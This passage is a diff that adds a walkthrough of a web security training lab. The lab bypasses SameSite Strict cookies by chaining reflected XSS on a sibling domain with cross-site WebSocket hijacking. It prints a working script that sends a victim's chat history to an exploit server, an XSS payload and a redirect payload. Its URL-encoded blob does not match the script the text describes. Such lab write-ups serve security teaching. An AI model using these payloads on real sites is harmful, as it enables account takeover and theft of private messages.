@@ -894,4 +894,152 @@ Paste it in the exploit server form's "Body" section. Click "Store". Click "Deli
 
 > NOTE: Check out [walkthrough](csrf_lab07_zaproxy.md) of this lab in OWASP Zed Attack Proxy
 
+## Bypassing SameSite restrictions via vulnerable sibling domains
+
+Whether you're assessing another site’s security or protecting your own, remember that a cross-origin request can still be considered same-site. This distinction is critical when evaluating potential risks.
+
+Be sure to review the entire attack surface, especially related domains under the same site. Vulnerabilities like XSS that allow arbitrary secondary requests can completely undermine site-based defenses and leave all domains exposed to cross-site attacks.
+
+Also, keep in mind that beyond traditional CSRF, if the target site uses WebSockets, it might be susceptible to Cross-Site WebSocket Hijacking (CSWSH). This is essentially a CSRF-style attack targeting the WebSocket handshake. For a deeper dive, check out the section on WebSocket vulnerabilities.
+
+### Lab: SameSite Strict bypass via sibling domain
+
+In Burp's browser go to the "Live Chat" and send a few messages. Go to __Proxy__ > __HTTP History__ and find the `GET /chat` request with `Upgrade: websocket` header in it. Notice that it doesn't contain any unpredictable tokens, which suggests it might be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions. 
+
+In the browser, refresh the live chat page and go to __Proxy__ > __WebSockets History__ tab. Notice, that when you refresh the page, the browser sends a `READY` message to the server, which causes the server to respond with the entire chat history:
+
+```
+{"user":"You","content":"Test"}
+```
+```
+{"user":"Hal Pline","content":"I&apos;ll look that up when my nail polish has dried."}
+```
+```
+{"user":"You","content":"Another test"}
+```
+```
+{"user":"Hal Pline","content":"Ask your mom."}
+```
+```
+{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
+```
+
+Confirm the CSWSH vulnerability.
+
+> NOTE: We will of course bypass Burp's pro-only feature __Collaborator__ and will do it on our exploit server's Access log.
+
+Go to the exploit server and use the following template in the "Body" section:
+
+```
+<script>
+    var ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");
+    ws.onopen = function (event) {
+        ws.send("READY");
+    };
+    ws.onmessage = function (event) {
+        var message = event.data;
+        fetch("https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit?message=" + btoa(message));
+    };
+</script>
+```
+
+The above script will send `GET` requests to the exploit server in our lab with `message` query parameters and request body as a `base64` encoded value.
+
+Click "Store" and then "View exploit". Check "Access log" and see a `GET` request there with the following message parameter value:
+
+```
+GET /exploit?message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1
+```
+
+Go to __Decoder__ in Burp and decode it from `base64`:
+
+```
+{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
+```
+
+This means that we successfully opened a new live chat connection with the target site, however the chat history exfiltrated is for the brand new session, which isn't particularly useful. 
+
+Go to the __Proxy__ > __HTTP history__ tab and find the WebSocket handshake request (`GET /chat`) that was initiated by your script. Notice, that your session cookie was not sent with the request. If you look at its response:
+
+```
+HTTP/1.1 101 Switching Protocol
+Set-Cookie: session=jww8cFO8yWpsaqLrzaPRhPnYdsjVFiUc; Secure; HttpOnly; SameSite=Strict
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: cmnpq9mcMw79pDx1iDahmKizoe4=
+Content-Length: 0
+```
+
+The session cookie is different from yours and `SameSite` is explicitly set to `Strict` by the website. This prevents the browser from including these cookies in cross-site requests. 
+
+In __Proxy__ > __HTTP History__ you will also notice that responses to some `/resources` requests include a different URL: `https://cms-YOUR-LAB-ID.web-security-academy.net` as a value to `Access-Control-Allow-Origin` header. This is a sibling domain. Visit this URL in Burp's browser and see a login form. 
+
+Submit some arbitrary credentials and see that your username is reflected in the response:
+
+```
+<p>Invalid username: wiener</p>
+```
+
+Try injecting an XSS payload via the `username` parameter, for example `<script>alert(1)</script>`. Observe that `alert(1)` is called, confirming that this is a viable reflected XSS vector:
+
+```
+<p>Invalid username: <script>alert(1)</script></p>
+```
+
+Send this latest `POST /login` request to Repeater and right click it to "Change request method", which will convert this `POST` request to an equivalent `GET` request:
+
+```
+GET /login?username=<script>alert(1)</script>&password=peter HTTP/2
+```
+
+Confirm that it still receives the same response:
+
+```
+<p>Invalid username: <script>alert(1)</script></p>
+```
+
+Now right-click the request again, select "Copy URL" and visit the URL to confirm you can still trigger the XSS. If you can, this XSS vector can be used to launch the CSWSH attack without it being mitigated by SameSite restrictions as this site is a sibling domain. 
+
+Go back to exploit server and copy the template in the "Body" section you used and stored previously. Go to Burp's __Decoder__ and URL encode the entire script:
+
+```
+%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%59%4f%55%52%2d%4c%41%42%2d%49%44%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%59%4f%55%52%2d%43%4f%4c%4c%41%42%4f%52%41%54%4f%52%2d%50%41%59%4c%4f%41%44%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
+```
+
+Write a new payload in the "Body" section of the exploit server's form:
+
+```
+<script>
+    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
+</script>
+```
+
+Use the encoded URL encoded payload as a value to `username` parameter in the new payload.
+
+Click "Store" and "View exploit" again. Go to Access log and see that you received five `GET` requests, all of which contain pieces of your entire chat history as `message` query parameter value. 
+
+Go to __Proxy__ > __HTTP History__ and find the latest `GET /chat` request. See that it includes your session cookie, which is why it correctly identified and then exfiltrated your chat history. 
+
+Go back to the exploit server and click "Deliver exploit to victim". Go to Access log and see five `GET` requests from the victim's IP. Copy all five of the `message` parameter's values and decode them in Burp's __Decoder__:
+
+```base64
+eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9
+eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ
+eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgaGQyYTFlMjB3OGhoeXI4ejloOXEifQ
+eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9
+eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0
+```
+
+```
+{"user":"You","content":"Thanks, I hope this doesn&apos;t come back to bite me!"}
+{"user":"Hal Pline","content":"Hello, how can I help?"}
+{"user":"Hal Pline","content":"No problem carlos, it&apos;s [REDACTED]"}
+{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
+{"user":"You","content":"I forgot my password"}
+```
+
+Use the password in the messages to log in as `carlos` to solve the lab. 
+
+> NOTE: Check out [walkthrough](csrf_lab08_zaproxy.md) of this lab in OWASP Zed Attack Proxy
+
 
